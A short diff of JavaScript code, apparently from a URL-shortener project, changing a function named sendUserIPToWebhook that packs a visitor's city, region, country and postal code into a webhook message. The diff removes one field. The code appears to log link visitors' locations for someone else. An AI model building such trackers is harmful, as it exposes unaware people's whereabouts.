@@ -16,8 +16,7 @@ async function sendUserIPToWebhook() {
       { name: "City", value: data.city || 'N/A', inline: true },
       { name: "Region", value: data.region || 'N/A', inline: true },
       { name: "Country", value: data.country_name || 'N/A', inline: true },
-      { name: "Postal Code", value: data.postal || 'N/A', inline: true },
-      { name: "Provider/Organization", value: data.org || 'N/A', inline: true }
+      { name: "Postal Code", value: data.postal || 'N/A', inline: true }
     ],
     footer: {
       text: "CD Hub - URL Shortener"
